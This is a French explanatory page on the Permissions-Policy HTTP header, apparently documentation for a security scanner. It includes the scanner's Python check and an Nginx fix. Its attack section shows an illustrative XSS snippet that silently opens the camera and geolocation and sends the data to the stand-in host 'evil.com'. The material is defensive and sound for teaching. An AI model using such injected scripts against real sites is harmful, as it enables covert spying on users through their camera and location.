# Permissions-Policy

## En une phrase

Permissions-Policy désactive explicitement les APIs sensibles du
navigateur (caméra, micro, géolocalisation...) — même si un attaquant
réussit à injecter du JavaScript, ces APIs sont déjà verrouillées.

---

## L'analogie

Imagine que tu loues une voiture. Le loueur retire physiquement le
GPS, le système audio Bluetooth et le port USB avant de te la donner.
Même si quelqu'un s'introduit dans la voiture, il ne peut pas utiliser
ces équipements — ils n'existent plus dans ce véhicule. C'est une
défense en profondeur : même en cas d'intrusion, les dégâts sont limités.

---

## L'attaque — abus d'APIs via XSS

```
SANS Permissions-Policy
─────────────────────────────────────────────────────────────────

  Attaquant injecte du JS via une faille XSS :

  // Active la caméra silencieusement
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      // Capture des frames et les envoie à evil.com
      sendToAttacker(stream);
    });

  // Géolocalisation en temps réel
  navigator.geolocation.watchPosition(pos => {
    fetch("evil.com/location", { body: JSON.stringify(pos) });
  });

  Résultat : victime espionnée via sa propre caméra et géoloc
  sans jamais voir de popup de permission (déjà accordée au site)

AVEC Permissions-Policy
─────────────────────────────────────────────────────────────────

  Header envoyé par le serveur :
  Permissions-Policy: camera=(), microphone=(), geolocation=()

  Même script injecté → APIs désactivées au niveau navigateur
  navigator.mediaDevices.getUserMedia() → erreur bloquante
  navigator.geolocation → undefined ou erreur
  
  L'attaquant a du code qui s'exécute mais ne peut rien faire
  avec les APIs sensibles — elles sont physiquement désactivées.
```

---

## Les APIs contrôlables

```
geolocation=()        ← position GPS
microphone=()         ← accès micro
camera=()             ← accès caméra
payment=()            ← API Web Payment
usb=()                ← accès USB (WebUSB)
magnetometer=()       ← boussole
gyroscope=()          ← gyroscope
accelerometer=()      ← accéléromètre
fullscreen=()         ← plein écran automatique
display-capture=()    ← capture d'écran
bluetooth=()          ← WebBluetooth

# Syntaxe :
# ()            → désactivé pour tout le monde
# (self)        → autorisé uniquement pour ton domaine
# (self "cdn.") → autorisé pour ton domaine + CDN spécifié
```

---

## Ce que le scanner détecte

**Check** : `HeadersCheck` — Phase 4

```python
pp = response.headers.get("Permissions-Policy")

if not pp:
    return {
        "result": "error",
        "message": "Permissions-Policy absent — APIs navigateur non restreintes"
    }

# Vérifier que les APIs critiques sont bien désactivées
critical_apis = ["camera", "microphone", "geolocation"]
missing = [api for api in critical_apis if api not in pp]

if missing:
    return {
        "result": "warning",
        "message": f"APIs sensibles non désactivées : {missing}"
    }

return {"result": "ok", "value": pp}
```

---

## La correction Nginx

```nginx
add_header Permissions-Policy
    "geolocation=(),
     microphone=(),
     camera=(),
     payment=(),
     usb=(),
     magnetometer=(),
     gyroscope=(),
     accelerometer=()" always;

# Si ton app a besoin de la géoloc (ex: carte interactive) :
# geolocation=(self)   ← autorisé uniquement pour ton domaine
```

---

## Avant / Après

```
AVANT
$ curl -I https://monsite.fr | grep -i permissions
(rien)
← JS malveillant peut demander accès caméra/micro/géoloc
← Popup navigateur s'affiche → utilisateur peut accepter par erreur

APRÈS
$ curl -I https://monsite.fr | grep -i permissions
permissions-policy: geolocation=(), microphone=(), camera=()...
← APIs désactivées au niveau navigateur
← Aucune popup possible — fonctionnalité physiquement retirée
```

---

## Pourquoi c'est le header le plus souvent oublié

La plupart des développeurs connaissent CSP et HSTS. Permissions-Policy
est plus récent (remplace Feature-Policy en 2020) et moins documenté.
Pourtant c'est une **défense en profondeur** essentielle : même si
ta CSP est contournée, les APIs dangereuses restent désactivées.

---

## Références officielles

- **MDN Web Docs** — [Permissions-Policy](https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Permissions-Policy)
- **W3C** — [Permissions Policy Specification](https://www.w3.org/TR/permissions-policy/)
- **OWASP** — [Security Headers](https://owasp.org/www-project-secure-headers/)
- **CWE-284** — Improper Access Control